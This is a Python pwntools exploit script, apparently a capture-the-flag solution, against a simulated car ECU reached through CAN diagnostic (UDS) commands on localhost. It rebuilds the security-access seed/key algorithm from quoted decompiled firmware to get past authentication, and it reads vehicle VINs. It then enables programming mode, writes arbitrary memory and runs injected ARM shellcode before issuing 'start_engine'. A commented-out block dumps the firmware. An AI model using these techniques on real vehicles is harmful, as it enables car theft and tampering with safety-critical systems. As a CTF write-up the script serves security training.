#!/usr/bin/env python3
from pwn import *

# context.log_level = "info"
context.encoding = "latin"
context.arch = "arm"


HOST, PORT = "localhost", 5000

DEFAULT         = "01"
DIAGNOSTIC      = "02"
DEVICE_CONTROL  = "03"

CHALLENGE_AUTHOR          = "00"
VEHICLE_MANUFACTUR        = "01"
VEHICLE_YEAR              = "02"
VEHICLE_IDENTIFIER_NUMBER = "03"

ROM        = 0x60010000
PROTECTED  = 0x61000000
RAM        = 0x70000000

cs_prefix = "cansend 7e0#"
sids = {
  "diagnostic_session": "20",
  "return_normal": "21",
  "security_access": "22",
  "read_memory": "23",
  "read_did": "24",
  "programming_mode": "25",
  "request_download": "26",
  "transfer_data": "27",
}

def translate_dword(dword: int):
  big_endian = dword.to_bytes(4, byteorder="big").hex()

  return big_endian

def translate_short(short: int):
  big_endian = short.to_bytes(2, byteorder="big").hex()

  return big_endian

def sendcmd(cmd: str):
  p.sendlineafter("> ", cmd)

def candump(clear: bool = False):
  cmd = "candump"
  cmd += " clear" if clear else ""

  sendcmd(cmd)

def initiate_diagnostic_session(sub_fn: str):
  cmd = cs_prefix + "02" + sids["diagnostic_session"] + sub_fn

  sendcmd(cmd)

def return_to_normal():
  cmd = cs_prefix + "00" + sids["return_normal"]

  sendcmd(cmd)

def read_memory(addr: int, length: int):
  assert length <= 0xffff, "Length can't be more than 0xffff"

  cmd = cs_prefix + format(8, '02x') + sids["read_memory"] + translate_dword(addr) + translate_short(length)
  sendcmd(cmd)

def arb_read(addr: int, length: int):

  offset = 0
  _data = b""
  lengths = length//0x1000 * [0x1000]

  for _len in lengths:
    candump(clear=True)
    read_memory(addr+offset, _len)
    candump()
    memory = bytes.fromhex(''.join(p.recvuntil("> ", drop=True).decode().strip().split("\n")[-1].split()[5:]))

    p.unrecv("> ")
    candump(clear=True)

    receive_all()
    candump()

    d = p.recvuntil(b"> ", drop=True).strip().decode().split("\n")
    p.unrecv("> ")
    # exit()

    for i in range(1, len(d)):
      memory += bytes.fromhex(''.join(d[i].split()[4:]))

    _data += memory[:_len]
    offset += _len
  
  return _data[:length]

def receive_all():
  sendcmd(cs_prefix + "30")

def request_seed():
  security_access(b"\x01")
  candump()

  d = p.recvuntil(b"> ", drop=True).strip().decode().split("\n")[-1].split()
  p.unrecv("> ")

  if d[4] == "62":
    return list(map(lambda x: int(x, 0x10), d[5:10]))

def validate_key(key):
  security_access(b"\x02" + pack(key, 'all', endianness='big'))

  candump()
  d = p.recvuntil(b"> ", drop=True).strip().decode().split("\n")[-1].split()
  p.unrecv("> ")

  return d[4] == "62"

def security_access(payload: str):
  cmd = cs_prefix + format(len(payload), "02x") + sids["security_access"] + payload.hex()

  candump(clear=True)
  sendcmd(cmd)

def read_did(did_id: str):
  candump(clear=True)

  cmd = cs_prefix + "02" + sids["read_did"] + did_id
  sendcmd(cmd)

  did = b""

  candump()
  d = p.recvuntil(b"> ", drop=True).strip().decode().split("\n")
  p.unrecv("> ")

  did_len = int(d[-1].split()[4], 16)
  did += bytes.fromhex(''.join(
    d[-1].split()[5:]
  ))

  if len(did) < did_len:
    candump(clear=True)
    receive_all()

    candump()
    d = p.recvuntil(b"> ", drop=True).strip().decode().split("\n")[1:]
    p.unrecv("> ")
    
    for data in d:
      did += bytes.fromhex(''.join(
        data.split()[4:]
      ))

  return did[:did_len].decode()

def enable_programming():
  cmd = cs_prefix + "00" + sids["programming_mode"]

  candump(clear=True)
  sendcmd(cmd)

  candump()
  d = p.recvuntil(b"> ", drop=True).strip().decode().split("\n")[-1].split()
  p.unrecv("> ")

  return d[4] == "65"

def arb_write(addr: int, data: bytes, execute=False):
  # request download
  candump(clear=True)
  cmd = cs_prefix + "03" + sids["request_download"] + format(len(data), "04x")
  sendcmd(cmd)

  candump()
  d = p.recvuntil(b"> ", drop=True).strip().decode().split("\n")[-1].split()
  p.unrecv("> ")

  assert d[4] == "66"

  # transfer data
  candump(clear=True)
  cmd = cs_prefix + "08" + sids["transfer_data"] + ("80" if execute else "00") + format(addr, '08x') + format(data[0], '02x')
  sendcmd(cmd)

  candump()

  # # send data
  idx = 1
  for i in range(1, len(data), 7):
    batch = p8(0x20 + idx) + data[i:i+7].ljust(7, b'\x00')
    sendcmd(cs_prefix + batch.hex())
    idx = (idx+1)
    idx = idx + 1 if idx == 0 else idx

  candump()

"""
void init_secret_rondo_string()
{
  unsigned __int8 gang[4]; // [sp+4h] [bp+4h] BYREF
  char product; // [sp+Bh] [bp+Bh]
  int j; // [sp+Ch] [bp+Ch]
  int i; // [sp+10h] [bp+10h]
  int total; // [sp+14h] [bp+14h]

  *(_DWORD *)gang = 'GNAG';
  total = 0;
  qmemcpy(encrypted_RONDO_STR, "RONDO", sizeof(encrypted_RONDO_STR));
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j < gang[i]; ++j )
    {
      product = seed[i] * encrypted_RONDO_STR[i];
      if ( product )
        encrypted_RONDO_STR[i] = product;
      else
        encrypted_RONDO_STR[i] = 'D';
    }
    total += (unsigned __int8)encrypted_RONDO_STR[i];
  }
  byte_6100001C = total;
}
"""
def keygen(seed: list[int]):
  rondo_str = list(map(ord, "RONDO"))
  gang = list(map(ord, "GANG"))
  # gang = "GNAG"
  _sum = 0

  for i in range(len(gang)):
    for _ in range(gang[i]):
      product = (seed[i] * rondo_str[i]) % 0x100

      if product != 0:
        rondo_str[i] = product
      else:
        rondo_str[i] = ord('D')
    
    _sum += rondo_str[i]
  
  rondo_str[4] = _sum % 0x100
  return int.from_bytes(rondo_str, byteorder='big')

# dump firmware to a file
"""
f = open(sys.argv[3], "wb")
step = 0x10000
for addr in range(int(sys.argv[1], 16), int(sys.argv[1], 16)+int(sys.argv[2], 16), step): # start, start+length, step
  memory = b""
  p = remote("localhost", 5000)
  
  initiate_diagnostic_session(DIAGNOSTIC)
  memory += arb_read(addr, step) # leak all rom section
  
  f.write(memory)
  f.flush()

  p.close()

f.close()

p.interactive()
"""

p = remote(HOST, PORT)

initiate_diagnostic_session(DIAGNOSTIC)
print("Entered Diagnostic session")

seed = request_seed()
key = keygen(seed)
assert validate_key(key)

print(f"Seed: {seed}")
print(f"Key: {key}")

print("Leaking VINs")
old_cs_prefix = cs_prefix
cs_prefix = "cansend 7c0#"
bcm_vin = read_did(VEHICLE_IDENTIFIER_NUMBER)
print(f"BCM VIN: {bcm_vin}")
cs_prefix = old_cs_prefix
ecm_vin = read_did(VEHICLE_IDENTIFIER_NUMBER)
print(f"ECM VIN: {ecm_vin}")


initiate_diagnostic_session(DEVICE_CONTROL)
print("Upgraded to Device control session")

assert enable_programming()
print("Enabled programming mode")

bcm_vin_addr = RAM+0x1000
arb_write(bcm_vin_addr, bcm_vin.encode())

# too lazy to write shellcode
sh = asm("""
    movw r4,0x15bc
    movt r4,0x6001
    movw r0,0x0098
    movt r0,0x6100
    movw r1,0x1000
    movt r1,0x7000
    blx r4
    movw r4,0x0983
    movt r4,0x6001
    bx r4
""")

shellcode_addr = RAM+0X2000
arb_write(shellcode_addr, sh, execute=True)

# write works
candump(clear=True)
# initiate_diagnostic_session(DIAGNOSTIC)
# # read_memory(RAM+0X1000, 0x11)
# candump()

p.sendline("start_engine")

p.interactive()